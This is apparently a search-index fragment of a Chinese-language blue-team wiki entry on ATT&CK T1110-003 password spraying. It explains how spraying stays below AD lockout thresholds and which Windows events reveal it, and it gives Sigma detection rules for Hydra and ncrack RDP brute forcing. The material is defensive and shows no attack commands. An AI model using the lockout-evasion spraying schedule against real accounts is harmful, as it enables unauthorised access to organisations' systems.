NetBIOS/SMB/Samba\uff08139/TCP\u548c445/TCP\uff09 LDAP\uff08389/TCP\uff09 Kerberos\uff0888/TCP\uff09 RDP /\u7ec8\u7aef\u670d\u52a1\uff083389/TCP\uff09 HTTP / HTTP\u7ba1\u7406\u670d\u52a1\uff0880/TCP\u548c443/TCP\uff09 MSSQL\uff081433/TCP\uff09 Oracle\uff081521/TCP\uff09 MySQL\uff083306/TCP\uff09 VNC\uff085900/TCP\uff09 RDP\u66b4\u529b\u7834\u89e3 \u8fdc\u7a0b\u684c\u9762\u534f\u8bae\uff08RDP, Remote Desktop Protocol\uff09\u662f\u4e00\u4e2a\u591a\u901a\u9053\uff08multi-channel\uff09\u7684\u534f\u8bae\uff0c\u8ba9\u7528\u6237\uff08\u5ba2\u6237\u7aef\u6216\u79f0\u201c\u672c\u5730\u7535\u8111\u201d\uff09\u8fde\u4e0a\u63d0\u4f9b\u5fae\u8f6f\u7ec8\u7aef\u673a\u670d\u52a1\u7684\u7535\u8111\uff08\u670d\u52a1\u5668\u7aef\u6216\u79f0\u201c\u8fdc\u7a0b\u7535\u8111\u201d\uff09\u3002\u5927\u90e8\u5206\u7684Windows\u90fd\u6709\u5ba2\u6237\u7aef\u6240\u9700\u8f6f\u4ef6\u3002\u5176\u4ed6\u64cd\u4f5c\u7cfb\u7edf\u4e5f\u6709\u8fd9\u4e9b\u5ba2\u6237\u7aef\u8f6f\u4ef6\uff0c\u4f8b\u5982Linux\u3001FreeBSD\u3001Mac OS X\u3002\u670d\u52a1\u7aef\u7535\u8111\u65b9\u9762\uff0c\u5219\u542c\u53d6\u9001\u5230TCP3389\u7aef\u53e3\u7684\u6570\u636e\u3002 \u5f53\u7cfb\u7edf\u5bc6\u7801\u8bbe\u7f6e\u8f83\u4e3a\u7b80\u5355\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u679a\u4e3e\u8d26\u6237\u5bc6\u7801\u7684\u65b9\u6cd5\u8fdb\u884c\u7834\u89e3\u767b\u5f55\u3002 \u5bc6\u7801\u55b7\u6d12\u653b\u51fb \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5f88\u591a\u65f6\u5019\u4eba\u4eec\u5bb9\u6613\u628a\u5bc6\u7801\u66b4\u529b\u7834\u89e3\u548c\u5bc6\u7801\u55b7\u5c04\u6280\u672f\u641e\u6df7\uff0c\u201c\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\u201d\uff08Password Spray Attack\uff09\u5e76\u4e0d\u7b49\u540c\u4e8e\u201c\u5bc6\u7801\u7206\u7834\u653b\u51fb\u201d\uff08Brute Force Attack\uff09\u3002\u4e8b\u5b9e\u4e0a\uff0c\u8fd9\u4e24\u79cd\u653b\u51fb\u662f\u76f8\u53cd\u7684\u3002 \u5728\u5bc6\u7801\u7206\u7834\u653b\u51fb\u4e2d\uff0c\u9ed1\u5ba2\u9009\u62e9\u4e00\u4e2a\u6613\u53d7\u653b\u51fb\u7684 ID \u5e76\u4e00\u4e2a\u63a5\u4e00\u4e2a\u5730\u8f93\u5165\u5bc6\u7801\uff0c\u5e0c\u671b\u6709\u4e00\u4e9b\u5bc6\u7801\u53ef\u4ee5\u8ba9\u4ed6\u4eec\u8fdb\u5165\u3002\u57fa\u672c\u4e0a\uff0c\u5bc6\u7801\u7206\u7834\u662f\u7528\u591a\u4e2a\u5bc6\u7801\u5c1d\u8bd5\u7834\u89e3\u540c\u4e00\u4e2a ID\u3002\u800c\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\uff0c\u662f\u7528\u4e00\u4e2a\u5bc6\u7801\u6765\u5c1d\u8bd5\u591a\u4e2a\u7528\u6237 ID\uff0c\u4ee5\u4fbf\u81f3\u5c11\u6709\u4e00\u4e2a\u7528\u6237 ID \u88ab\u6cc4\u9732\u3002\u5bf9\u4e8e\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\uff0c\u9ed1\u5ba2\u4f7f\u7528\u793e\u4ea4\u5de5\u7a0b\u6216\u5176\u4ed6\u7f51\u7edc\u9493\u9c7c\u65b9\u6cd5\u6536\u96c6\u591a\u4e2a\u7528\u6237 ID\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u81f3\u5c11\u6709\u4e00\u4e2a\u7528\u6237\u4f7f\u7528\u7b80\u5355\u7684\u5bc6\u7801\uff0c\u598212345678\u751a\u81f3\u662f p@ssw0rd\u3002 \u5728\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\u4e2d\uff0c\u9ed1\u5ba2\u4f1a\u4e3a\u5176\u6536\u96c6\u7684\u6240\u6709\u7528\u6237 ID \u7cbe\u5fc3\u6784\u9020\u5bc6\u7801\u3002\u56e0\u6b64\uff0c\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\u53ef\u4ee5\u5b9a\u4e49\u4e3a\u5c06\u76f8\u540c\u7684\u5bc6\u7801\u5e94\u7528\u4e8e\u7ec4\u7ec7\u4e2d\u7684\u591a\u4e2a\u7528\u6237\u5e10\u6237\uff0c\u76ee\u7684\u662f\u5b89\u5168\u7684\u5bf9\u5176\u4e2d\u4e00\u4e2a\u5e10\u6237\u8fdb\u884c\u672a\u6388\u6743\u8bbf\u95ee\u3002 \u66b4\u529b\u7834\u89e3\u7684\u95ee\u9898\u5728\u4e8e\uff0c\u5728\u4f7f\u7528\u4e0d\u540c\u5bc6\u7801\u8fdb\u884c\u4e00\u5b9a\u6b21\u6570\u7684\u5c1d\u8bd5\u540e\uff0c\u7cfb\u7edf\u53ef\u80fd\u4f1a\u88ab\u9501\u5b9a\u3002\u4e3a\u4e86\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\uff0c\u4ea7\u751f\u4e86\u6536\u96c6\u7528\u6237 ID \u5e76\u5c06\u53ef\u80fd\u7684\u5bc6\u7801\u5e94\u7528\u4e8e\u5b83\u4eec\u7684\u60f3\u6cd5\u3002\u4f7f\u7528\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\u65f6\uff0c\u9ed1\u5ba2\u4e5f\u4f1a\u91c7\u53d6\u4e00\u4e9b\u9884\u9632\u63aa\u65bd\u3002\u4f8b\u5982\uff0c\u5982\u679c\u4ed6\u4eec\u5c1d\u8bd5\u5c06 password1\u5e94\u7528\u4e8e\u6240\u6709\u7528\u6237\u5e10\u6237\uff0c\u5219\u5728\u5b8c\u6210\u7b2c\u4e00\u8f6e\u540e\uff0c\u4ed6\u4eec\u4e0d\u4f1a\u7acb\u5373\u5f00\u59cb\u5c06 password2\u5e94\u7528\u4e8e\u8fd9\u4e9b\u5e10\u6237\u3002\u4ed6\u4eec\u5c06\u5728\u9ed1\u5ba2\u653b\u51fb\u4e2d\u7559\u51fa\u81f3\u5c1130\u5206\u949f\u7684\u65f6\u95f4\u3002 \u6d4b\u8bd5\u6848\u4f8b \u4ec5\u6587\u5b57\u63cf\u8ff0 \u7531\u4e8eAD\u7528\u6237\u8bbe\u7f6e\u9501\u5b9a\u9608\u503c\u4e3a5\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u4e3a\u6bcf\u4e2a\u7528\u6237\u5c1d\u8bd54\u4e2a\u4e0d\u540c\u7684\u5bc6\u7801\uff0c\u7136\u540e\u6211\u4eec\u7b49\u5f8530\u5206\u949f\u6216\u8005\u6bd430\u5206\u949f\u66f4\u957f\u7684\u65f6\u95f4\uff08\u9501\u5b9a\u7a97\u53e3\uff0c\u5176\u4e2dDC\u4fdd\u6301\u9501\u5b9a\u8ba1\u6570\uff0c\u6b64\u540e\u91cd\u7f6e\u4e3a0\uff09\uff0c\u7136\u540e\u518d\u8bd5\u4e00\u6b21\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6536\u96c6\u6709\u5173AD\u57df\u73af\u5883\u7684\u5bc6\u7801\u7b56\u7565\u4fe1\u606f\uff0c\u5e2e\u52a9\u653b\u51fb\u8005\u80fd\u591f\u66f4\u597d\u5730\u4f7f\u7528\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\u3002 \u5bc6\u7801\u55b7\u5c04\u653b\u51fb\u901a\u5e38\u5e94\u7528\u5230SMB\u5171\u4eab\u6216RDP\u670d\u52a1\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4ece\u8fd9\u4e24\u70b9\u5165\u624b\uff0c\u8fd9\u4e24\u7c7b\u670d\u52a1\u5728\u4f01\u4e1a\u5185\u7f51\u4e2d\u662f\u975e\u5e38\u5e38\u89c1\u7684\u3002\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\u4f1a\u4ea7\u751f\u5927\u91cf\u7684windows\u4e8b\u4ef6ID 4625\u767b\u5f55\u5931\u8d25 \u3002\u5f53\u53d1\u73b0\u5927\u91cf\u6b64\u7c7b\u4e8b\u4ef6\u65f6\uff0c\u5b83\u503c\u5f97\u5f15\u8d77\u4f60\u7684\u6ce8\u610f\u3002 \u5f53\u653b\u51fb\u8005\u901a\u8fc7\u66f4\u6539\u8fde\u63a5\u7684\u670d\u52a1\u6765\u907f\u514dwindows\u4ea7\u751f\u4e8b\u4ef6ID4625\uff0c\u5373\u4e0d\u518d\u8fde\u63a5SMB\u6216\u8005RDP\u670d\u52a1\uff0c\u800c\u662f\u8fde\u63a5\u5230\u57df\u63a7\u5236\u5668\u4e0a\u7684LDAP\u670d\u52a1\uff0c\u8bb8\u591a\u7ec4\u7ec7\u90fd\u5728\u96c6\u4e2d\u7cbe\u529b\u53bb\u76d1\u89c64625\u4e8b\u4ef6\u3002\u4f46\u5982\u679c\u8fde\u63a5\u5230LDAP\u670d\u52a1\u8fdb\u884c\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\uff0c\u5219\u4e0d\u4f1a\u8bb0\u5f554625\u4e8b\u4ef6\u3002\u5219\u4f1a\u8bb0\u5f55Kerberos\u65e5\u5fd7\u4e8b\u4ef6 4771 \uff0c\u5e76\u76d1\u6d4b \u201cKerberos\u9884\u8eab\u4efd\u9a8c\u8bc1\u5931\u8d25\u201d \u3002\u5728\u4e8b\u4ef6ID 4771\u4e2d\uff0c \u5931\u8d25\u4ee3\u7801\u4e3a\u201c0x18\u201d, \u8fd9\u610f\u5473\u7740\u5bc6\u7801\u9519\u8bef\u3002 \u5728\u63a5\u5165\u57df\u7684\u8ba1\u7b97\u673a\u4e0a\u6267\u884c\u5bc6\u7801\u55b7\u5c04\u65f6\uff0c\u5982\u679c\u653b\u51fb\u8005\u5728\u6b64\u7cfb\u7edf\u4e0a\uff08\u5373\u57df\u5185\u4efb\u610f\u4e3b\u673a\u7cfb\u7edf\uff09\u8fd0\u884c\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\uff0c\u5219\u4f1a\u5728\u6b64\u4e3b\u673a\u4e0a\u8bb0\u5f55 \u4e8b\u4ef6ID4648\uff08\u201c\u4f7f\u7528\u663e\u5f0f\u51ed\u636e\u5c1d\u8bd5\u767b\u5f55\u201d\uff09 \u3002\u5982\u679c\u5728\u51e0\u79d2\u949f\u5185\u8bb0\u5f55\u4e86\u5927\u91cf4648\u4e8b\u4ef6\uff0c\u8fd9\u79cd\u60c5\u51b5\u662f\u5f02\u5e38\u7684\uff0c\u4f60\u9700\u8981\u91cd\u70b9\u5173\u6ce8\u3002 \u68c0\u6d4b\u65e5\u5fd7 \u5728AD\u73af\u5883\u4e2d\u8fdb\u884c\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u542f\u7528\u9002\u5f53\u7684\u65e5\u5fd7\u8bb0\u5f55\u548c\u6709\u6548\u7684\u5173\u8054\u6765\u8fdb\u884c\u68c0\u6d4b\u548c\u53d1\u73b0\u3002 \u4e3b\u8981\u7684\u65e5\u5fd7\u5ba1\u6838\u7b56\u7565\uff1a \u57df\u63a7\u5236\u5668\uff1a\u4e8b\u4ef6ID4625 \u5ba1\u6838\u767b\u5f55\uff08\u6210\u529f\u548c\u5931\u8d25\uff09 \u57df\u63a7\u5236\u5668\uff1a\u4e8b\u4ef6ID4771 \u5ba1\u6838Kerberos\u8eab\u4efd\u9a8c\u8bc1\u670d\u52a1 \uff08\u6210\u529f\u548c\u5931\u8d25\uff09 \u6240\u6709\u7cfb\u7edf\uff1a\u4e8b\u4ef6ID4648 \u5ba1\u6838\u767b\u5f55\uff08\u6210\u529f\u548c\u5931\u8d25\uff09 \u6d4b\u8bd5\u590d\u73b0 \u573a\u666f\u4e00\uff1a\u5229\u7528Hydra\u8fdb\u884cRDP\u7206\u7834 \u573a\u666f\u4e8c\uff1a\u5229\u7528ncrack\u8fdb\u884cRDP\u7206\u7834 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 \u573a\u666f\u4e00\uff1a\u68c0\u6d4b\u89c4\u5219 title: Hydra win7 RDP\u7206\u7834 description: kali windows hydra references: https://www.96007.club/2019/09/17/Credential-Access-win-Password-spraying/ tags: T1110-003 status: experimental author: Blue team logsource: product: windows service: security detection: selection1: EventID: 4771 #\u8ba1\u7b97\u673a\u8bd5\u56fe\u9a8c\u8bc1\u5e10\u6237\u7684\u51ed\u636e\u3002 AuthenticationPackage: 'MICROSOFT_AUTHENTICATION_PACKAGE_V1_0' LogonAccount: '*' SourceWorkstation: '*' ErrorCode: '0xc0000064' selection2: EventID: 4625 LogonType: 3 FailureReason: '\u672a\u77e5\u7528\u6237\u540d\u6216\u5bc6\u7801\u9519\u8bef\u3002' #\u5931\u8d25\u4fe1\u606f>\u5931\u8d25\u539f\u56e0 Status: 0xc000006d #\u5931\u8d25\u4fe1\u606f>\u72b6\u6001 SubStatus: 0xc0000064 #\u5931\u8d25\u4fe1\u606f>\u5b50\u72b6\u6001 LogonProcess: 'NtLmSsp' #\u8be6\u7ec6\u7684\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f>\u767b\u9646\u8fdb\u7a0b AuthenticationPackage: 'NTLM' #\u8be6\u7ec6\u7684\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f>\u8eab\u4efd\u9a8c\u8bc1\u5305 timeframe: last 2s condition: all of them level: medium #\u6ce8\u610f\uff1a\u5728\u4e00\u5206\u949f\u5185\uff0c\u540c\u4e00\u4e3b\u673a\u4e8b\u4ef6ID\u4e3a4625\u7684\u4e8b\u4ef6\u5927\u4e8e50\u4e2a\uff1b \u573a\u666f\u4e8c\uff1a\u68c0\u6d4b\u89c4\u5219 title: ncrack win7 RDP\u7206\u7834 description: kali windows ncrack references: https://www.96007.club/2019/09/17/Credential-Access-win-Password-spraying/ tags: T1110-003 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 4771 #\u8ba1\u7b97\u673a\u8bd5\u56fe\u9a8c\u8bc1\u5e10\u6237\u7684\u51ed\u636e\u3002 AuthenticationPackage: 'MICROSOFT_AUTHENTICATION_PACKAGE_V1_0' LogonAccount: '*' SourceWorkstation: '*' #\u6e90\u5de5\u4f5c\u7ad9\u5730\u5740\u7b49\u4e8ewin7\u672c\u673a\u4e3b\u673a\u540d ErrorCode: 0xc0000064 selection2: EventID: 4625 LogonType: 10 FailureReason: '\u672a\u77e5\u7528\u6237\u540d\u6216\u5bc6\u7801\u9519\u8bef\u3002' #\u5931\u8d25\u4fe1\u606f>\u5931\u8d25\u539f\u56e0 Status: 0xc000006d #\u5931\u8d25\u4fe1\u606f>\u72b6\u6001 SubStatus: 0xc0000064 #\u5931\u8d25\u4fe1\u606f>\u5b50\u72b6\u6001 CallerProcessName: 'C:\\Windows\\System32\\winlogon.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8c03\u7528\u65b9\u8fdb\u7a0b\u540d LogonProcess: 'User32' #\u8be6\u7ec6\u7684\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f>\u767b\u9646\u8fdb\u7a0b AuthenticationPackage: 'Negotiate' #\u8be6\u7ec6\u7684\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f>\u8eab\u4efd\u9a8c\u8bc1\u5305 timeframe: last 2s condition: all of them level: medium #\u6ce8\u610f\uff1a\u5728\u4e00\u5206\u949f\u5185\uff0c\u540c\u4e00\u4e3b\u673a\u4e8b\u4ef6ID\u4e3a4625\u7684\u4e8b\u4ef6\u5927\u4e8e50\u4e2a\uff1b \u5efa\u8bae \u5728\u4e00\u5206\u949f\u5185\uff0c\u540c\u4e00\u4e3b\u673a\u5931\u8d25\u4ee3\u7801\u4e3a0x18\uff0c\u4e8b\u4ef6ID\u4e3a4771\u7684\u4e8b\u4ef6\u5927\u4e8e50\u4e2a\uff1b \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u6b64\u89c4\u5219\u53ea\u9002\u7528\u4e8e\u57df\u63a7\u5236\u5668 \u5728\u4e00\u5206\u949f\u5185\uff0c\u540c\u4e00\u4e3b\u673a\u4e0a\u4e8b\u4ef6ID\u4e3a4648\u7684\u4e8b\u4ef6\u5927\u4e8e100\u4e2a\uff1b \u60a8\u53ef\u4ee5\u6839\u636e\u60a8\u7684\u5177\u4f53\u73af\u5883\u901a\u8fc7\u7f29\u77ed\u65f6\u95f4\u9608\u503c\u6216\u4e8b\u4ef6\u6570\u91cf\u9608\u503c\u6765\u8c03\u6574\u6bcf\u4e2a\u544a\u8b66\u89c4\u5219\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1110-003 https://attack.mitre.org/techniques/T1110/003 LDAP\u8f7b\u91cf\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae https://baike.baidu.com/item/LDAP/2875565?fr=aladdin \u7206\u7834\u5de5\u5177 Hydra \u7b80\u5355\u4f7f\u7528 https://www.jianshu.com/p/4da49f179cee CrackMapExec\uff1a\u4e00\u6b3e\u9488\u5bf9\u5927\u578bWindows\u6d3b\u52a8\u76ee\u5f55(AD)\u7684\u540e\u6e17\u900f\u5de5\u5177 https://www.freebuf.com/sectool/184573.html","title":"T1110-003-windows-\u5bc6\u7801\u55b7\u5c04"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/#t1110-003-windows-","text":"","title":"T1110-003-windows-\u5bc6\u7801\u55b7\u5c04"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/#attck","text":"\u5f53\u5bc6\u7801\u672a\u77e5\u6216\u83b7\u5f97\u5bc6\u7801\u54c8\u5e0c\u503c\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u66b4\u529b\u7834\u89e3\u6280\u672f\u5c1d\u8bd5\u8bbf\u95ee\u5e10\u6237\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u64cd\u4f5c\u671f\u95f4\u5c1d\u8bd5\u66b4\u529b\u7834\u89e3\u767b\u5f55\uff0c\u8fd9\u662f\u4e00\u4e2a\u98ce\u9669\u8f83\u9ad8\u7684\u9009\u9879\uff0c\u56e0\u4e3a\u5b83\u53ef\u80fd\u5bfc\u81f4\u5927\u91cf\u8eab\u4efd\u9a8c\u8bc1\u5931\u8d25\u8bb0\u5f55\u548c\u5e10\u6237\u9501\u5b9a\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u7ec4\u7ec7\u7684\u767b\u5f55\u5931\u8d25\u7b56\u7565\u3002 \u5bc6\u7801\u55b7\u5c04\u6280\u672f\u662f\u4f7f\u7528\u4e00\u4e2a\u5bc6\u7801\uff08\u4f8b\u5982\uff0c\u201cPassword01\u201d\uff09\u6216\u4e00\u5c0f\u7ec4\u5bc6\u7801\uff0c\u5176\u5339\u914d\u57df\u7684\u590d\u6742\u6027\u7b56\u7565\u5e76\u4e14\u53ef\u4ee5\u662f\u5e38\u7528\u5bc6\u7801\u3002\u5c1d\u8bd5\u4f7f\u7528\u8be5\u5bc6\u7801\u7684 \u4e0d\u540c\u8d26\u6237 \u8fdb\u884c\u767b\u5f55\uff0c\u4ece\u800c\u907f\u514d\u89e6\u53d1\u7ec4\u7ec7\u5185\u7684\u7b56\u7565\u5bfc\u81f4\u8d26\u6237\u9501\u5b9a\u3002 \u901a\u5e38\uff0c\u5728\u5bc6\u7801\u55b7\u5c04\u65f6\u4f7f\u7528\u5e38\u7528\u7aef\u53e3\u4e0a\u7684\u7ba1\u7406\u670d\u52a1\u3002\u901a\u7528\u76ee\u6807\u670d\u52a1\u5305\u62ec\u4ee5\u4e0b\u5185\u5bb9\uff1a SSH\uff0822/TCP\uff09 Telnet\uff0823/TCP\uff09 FTP\uff0821/ TCP\uff09 NetBIOS/SMB/Samba\uff08139/TCP\u548c445/TCP\uff09 LDAP\uff08389/TCP\uff09 Kerberos\uff0888/TCP\uff09 RDP /\u7ec8\u7aef\u670d\u52a1\uff083389/TCP\uff09 HTTP / HTTP\u7ba1\u7406\u670d\u52a1\uff0880/TCP\u548c443/TCP\uff09 MSSQL\uff081433/TCP\uff09 Oracle\uff081521/TCP\uff09 MySQL\uff083306/TCP\uff09 VNC\uff085900/TCP\uff09","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/#rdp","text":"\u8fdc\u7a0b\u684c\u9762\u534f\u8bae\uff08RDP, Remote Desktop Protocol\uff09\u662f\u4e00\u4e2a\u591a\u901a\u9053\uff08multi-channel\uff09\u7684\u534f\u8bae\uff0c\u8ba9\u7528\u6237\uff08\u5ba2\u6237\u7aef\u6216\u79f0\u201c\u672c\u5730\u7535\u8111\u201d\uff09\u8fde\u4e0a\u63d0\u4f9b\u5fae\u8f6f\u7ec8\u7aef\u673a\u670d\u52a1\u7684\u7535\u8111\uff08\u670d\u52a1\u5668\u7aef\u6216\u79f0\u201c\u8fdc\u7a0b\u7535\u8111\u201d\uff09\u3002\u5927\u90e8\u5206\u7684Windows\u90fd\u6709\u5ba2\u6237\u7aef\u6240\u9700\u8f6f\u4ef6\u3002\u5176\u4ed6\u64cd\u4f5c\u7cfb\u7edf\u4e5f\u6709\u8fd9\u4e9b\u5ba2\u6237\u7aef\u8f6f\u4ef6\uff0c\u4f8b\u5982Linux\u3001FreeBSD\u3001Mac OS X\u3002\u670d\u52a1\u7aef\u7535\u8111\u65b9\u9762\uff0c\u5219\u542c\u53d6\u9001\u5230TCP3389\u7aef\u53e3\u7684\u6570\u636e\u3002 \u5f53\u7cfb\u7edf\u5bc6\u7801\u8bbe\u7f6e\u8f83\u4e3a\u7b80\u5355\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u679a\u4e3e\u8d26\u6237\u5bc6\u7801\u7684\u65b9\u6cd5\u8fdb\u884c\u7834\u89e3\u767b\u5f55\u3002","title":"RDP\u66b4\u529b\u7834\u89e3"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/#_1","text":"\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5f88\u591a\u65f6\u5019\u4eba\u4eec\u5bb9\u6613\u628a\u5bc6\u7801\u66b4\u529b\u7834\u89e3\u548c\u5bc6\u7801\u55b7\u5c04\u6280\u672f\u641e\u6df7\uff0c\u201c\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\u201d\uff08Password Spray Attack\uff09\u5e76\u4e0d\u7b49\u540c\u4e8e\u201c\u5bc6\u7801\u7206\u7834\u653b\u51fb\u201d\uff08Brute Force Attack\uff09\u3002\u4e8b\u5b9e\u4e0a\uff0c\u8fd9\u4e24\u79cd\u653b\u51fb\u662f\u76f8\u53cd\u7684\u3002 \u5728\u5bc6\u7801\u7206\u7834\u653b\u51fb\u4e2d\uff0c\u9ed1\u5ba2\u9009\u62e9\u4e00\u4e2a\u6613\u53d7\u653b\u51fb\u7684 ID \u5e76\u4e00\u4e2a\u63a5\u4e00\u4e2a\u5730\u8f93\u5165\u5bc6\u7801\uff0c\u5e0c\u671b\u6709\u4e00\u4e9b\u5bc6\u7801\u53ef\u4ee5\u8ba9\u4ed6\u4eec\u8fdb\u5165\u3002\u57fa\u672c\u4e0a\uff0c\u5bc6\u7801\u7206\u7834\u662f\u7528\u591a\u4e2a\u5bc6\u7801\u5c1d\u8bd5\u7834\u89e3\u540c\u4e00\u4e2a ID\u3002\u800c\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\uff0c\u662f\u7528\u4e00\u4e2a\u5bc6\u7801\u6765\u5c1d\u8bd5\u591a\u4e2a\u7528\u6237 ID\uff0c\u4ee5\u4fbf\u81f3\u5c11\u6709\u4e00\u4e2a\u7528\u6237 ID \u88ab\u6cc4\u9732\u3002\u5bf9\u4e8e\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\uff0c\u9ed1\u5ba2\u4f7f\u7528\u793e\u4ea4\u5de5\u7a0b\u6216\u5176\u4ed6\u7f51\u7edc\u9493\u9c7c\u65b9\u6cd5\u6536\u96c6\u591a\u4e2a\u7528\u6237 ID\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u81f3\u5c11\u6709\u4e00\u4e2a\u7528\u6237\u4f7f\u7528\u7b80\u5355\u7684\u5bc6\u7801\uff0c\u598212345678\u751a\u81f3\u662f p@ssw0rd\u3002 \u5728\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\u4e2d\uff0c\u9ed1\u5ba2\u4f1a\u4e3a\u5176\u6536\u96c6\u7684\u6240\u6709\u7528\u6237 ID \u7cbe\u5fc3\u6784\u9020\u5bc6\u7801\u3002\u56e0\u6b64\uff0c\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\u53ef\u4ee5\u5b9a\u4e49\u4e3a\u5c06\u76f8\u540c\u7684\u5bc6\u7801\u5e94\u7528\u4e8e\u7ec4\u7ec7\u4e2d\u7684\u591a\u4e2a\u7528\u6237\u5e10\u6237\uff0c\u76ee\u7684\u662f\u5b89\u5168\u7684\u5bf9\u5176\u4e2d\u4e00\u4e2a\u5e10\u6237\u8fdb\u884c\u672a\u6388\u6743\u8bbf\u95ee\u3002 \u66b4\u529b\u7834\u89e3\u7684\u95ee\u9898\u5728\u4e8e\uff0c\u5728\u4f7f\u7528\u4e0d\u540c\u5bc6\u7801\u8fdb\u884c\u4e00\u5b9a\u6b21\u6570\u7684\u5c1d\u8bd5\u540e\uff0c\u7cfb\u7edf\u53ef\u80fd\u4f1a\u88ab\u9501\u5b9a\u3002\u4e3a\u4e86\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\uff0c\u4ea7\u751f\u4e86\u6536\u96c6\u7528\u6237 ID \u5e76\u5c06\u53ef\u80fd\u7684\u5bc6\u7801\u5e94\u7528\u4e8e\u5b83\u4eec\u7684\u60f3\u6cd5\u3002\u4f7f\u7528\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\u65f6\uff0c\u9ed1\u5ba2\u4e5f\u4f1a\u91c7\u53d6\u4e00\u4e9b\u9884\u9632\u63aa\u65bd\u3002\u4f8b\u5982\uff0c\u5982\u679c\u4ed6\u4eec\u5c1d\u8bd5\u5c06 password1\u5e94\u7528\u4e8e\u6240\u6709\u7528\u6237\u5e10\u6237\uff0c\u5219\u5728\u5b8c\u6210\u7b2c\u4e00\u8f6e\u540e\uff0c\u4ed6\u4eec\u4e0d\u4f1a\u7acb\u5373\u5f00\u59cb\u5c06 password2\u5e94\u7528\u4e8e\u8fd9\u4e9b\u5e10\u6237\u3002\u4ed6\u4eec\u5c06\u5728\u9ed1\u5ba2\u653b\u51fb\u4e2d\u7559\u51fa\u81f3\u5c1130\u5206\u949f\u7684\u65f6\u95f4\u3002","title":"\u5bc6\u7801\u55b7\u6d12\u653b\u51fb"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/#_2","text":"\u4ec5\u6587\u5b57\u63cf\u8ff0 \u7531\u4e8eAD\u7528\u6237\u8bbe\u7f6e\u9501\u5b9a\u9608\u503c\u4e3a5\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u4e3a\u6bcf\u4e2a\u7528\u6237\u5c1d\u8bd54\u4e2a\u4e0d\u540c\u7684\u5bc6\u7801\uff0c\u7136\u540e\u6211\u4eec\u7b49\u5f8530\u5206\u949f\u6216\u8005\u6bd430\u5206\u949f\u66f4\u957f\u7684\u65f6\u95f4\uff08\u9501\u5b9a\u7a97\u53e3\uff0c\u5176\u4e2dDC\u4fdd\u6301\u9501\u5b9a\u8ba1\u6570\uff0c\u6b64\u540e\u91cd\u7f6e\u4e3a0\uff09\uff0c\u7136\u540e\u518d\u8bd5\u4e00\u6b21\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6536\u96c6\u6709\u5173AD\u57df\u73af\u5883\u7684\u5bc6\u7801\u7b56\u7565\u4fe1\u606f\uff0c\u5e2e\u52a9\u653b\u51fb\u8005\u80fd\u591f\u66f4\u597d\u5730\u4f7f\u7528\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\u3002 